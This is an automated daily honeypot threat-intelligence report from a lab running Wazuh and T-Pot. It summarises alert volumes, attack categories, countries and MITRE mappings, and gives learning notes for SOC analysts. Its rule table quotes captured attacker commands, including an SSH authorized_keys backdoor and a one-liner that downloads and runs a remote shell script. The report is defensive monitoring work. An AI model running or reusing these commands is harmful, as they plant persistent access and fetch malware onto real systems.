# LearningLab01 Daily Threat Intelligence Report — 2026-10-05

Generated: 2026-10-05T13:15:05.051Z

Report window: 2026-10-04T13:15:05.028Z through 2026-10-05T13:15:05.028Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 262,014 |
| Attack-related alerts | 26,369 |
| Honeypot interactions | 245,605 |
| Authentication failures | 6,861 |
| Authentication successes | 664 |
| Critical alerts | 220 |
| High alerts | 790 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 220 critical-severity alerts require priority review.
- 790 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 10.33:1.
- Country attribution currently covers only 18.73% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110204: T-Pot Honeytrap connection from [IP address] to port 5906 (94,507 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 220 | 0.08% |
| High | 790 | 0.30% |
| Medium | 2,693 | 1.03% |
| Low | 258,311 | 98.59% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 6,861
- Authentication successes: 664
- Failure-to-success ratio: 10.33:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 16,164 | 61.30% |
| Payload delivery | 16,164 | 61.30% |
| Authentication failure | 6,861 | 26.02% |
| Command execution | 2,152 | 8.16% |
| Reconnaissance | 501 | 1.90% |
| Malware | 267 | 1.01% |
| Network scan | 261 | 0.99% |
| Web attack | 55 | 0.21% |
| SMTP attack | 10 | 0.04% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 49,078 alerts, representing 18.73% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 212,936 | 81.27% | Not geolocated |
| Russia | 22,163 | 8.46% | ████████████████████ |
| Kazakhstan | 11,927 | 4.55% | ███████████ |
| United States | 11,730 | 4.48% | ███████████ |
| Republic of Moldova | 1,913 | 0.73% | ██ |
| Germany | 1,187 | 0.45% | █ |
| United Kingdom | 147 | 0.06% | █ |
| China | 3 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Netherlands | 2 | 0.00% | █ |
| Romania | 2 | 0.00% | █ |
| Turkey | 2 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 292 |
| Initial Access | 291 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Execution | 126 |
| Lateral Movement | 97 |
| Credential Access | 80 |
| Impact | 11 |
| Command and Control | 4 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Command and Scripting Interpreter | 126 |
| Remote Services | 97 |
| Brute Force | 80 |
| Stored Data Manipulation | 11 |
| Ingress Tool Transfer | 4 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110204 | 4 | 94,507 | T-Pot Honeytrap connection from [IP address] to port 5906 | tpot (94,507) |
| 110213 | 4 | 58,479 | T-Pot RDP connection from [IP address] to port 3389. | tpot (58,479) |
| 110219 | 4 | 48,818 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html?fcadbadd=1 HTTP/1.1" 200 - | tpot (48,818) |
| 110207 | 5 | 25,319 | T-Pot SentryPeer SIP activity from [IP address]:3114, method INVITE | tpot (25,319) |
| 110205 | 6 | 16,094 | T-Pot Honeytrap received a payload from [IP address] | tpot (16,094) |
| 110102 | 5 | 6,861 | Cowrie failed login from [IP address] using username root. | tpot (6,861) |
| 110101 | 3 | 5,980 | Cowrie SSH connection from [IP address]. | tpot (5,980) |
| 110104 | 7 | 1,802 | Cowrie captured a command from [IP address]: cat /bin/echo | tpot (1,802) |
| 110209 | 5 | 1,062 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (1,062) |
| 110201 | 4 | 523 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (523) |
| 110103 | 10 | 373 | Cowrie accepted login from [IP address] using username root. | tpot (373) |
| 110214 | 9 | 256 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (256) |
| 533 | 7 | 239 | Listened ports status (netstat) changed (new port opened or closed). | tpot (239) |
| 110109 | 13 | 220 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (220) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 5502 | 3 | 178 | PAM: Login session closed. | tpot (177), wazuh (1) |
| 110105 | 12 | 137 | Cowrie captured a file download from [IP address]. | tpot (137) |
| 110108 | 12 | 126 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (126) |
| 110222 | 9 | 122 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (122) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110221 | 7 | 92 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (92) |
| 110106 | 10 | 80 | Cowrie detected repeated failed logins from [IP address]. | tpot (80) |
| 110216 | 4 | 78 | T-Pot Mailoney received SMTP command from [IP address]: QUIT | tpot (78) |
| 110212 | 10 | 70 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (70) |
| 110223 | 5 | 53 | T-Pot HoneyAML received  request from  to  on port . | tpot (53) |
| 110215 | 4 | 52 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (52) |
| 110220 | 8 | 46 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (46) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 203 | 9 | 35 | Agent event queue is full. Events may be lost. | tpot (35) |
| 110208 | 7 | 16 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5068 | tpot (16) |
| 202 | 7 | 12 | Agent event queue is 90% full. | tpot (12) |
| 205 | 3 | 12 | Agent event queue is back to normal load. | tpot (12) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110217 | 7 | 10 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: rcpt to:<kingebonic2019@yahoo.com>  | tpot (10) |
| 110211 | 9 | 5 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (5) |
| 110107 | 12 | 4 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (4) |
| 110224 | 7 | 2 | T-Pot HoneyAML received an HTTP POST from [IP address] to /. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
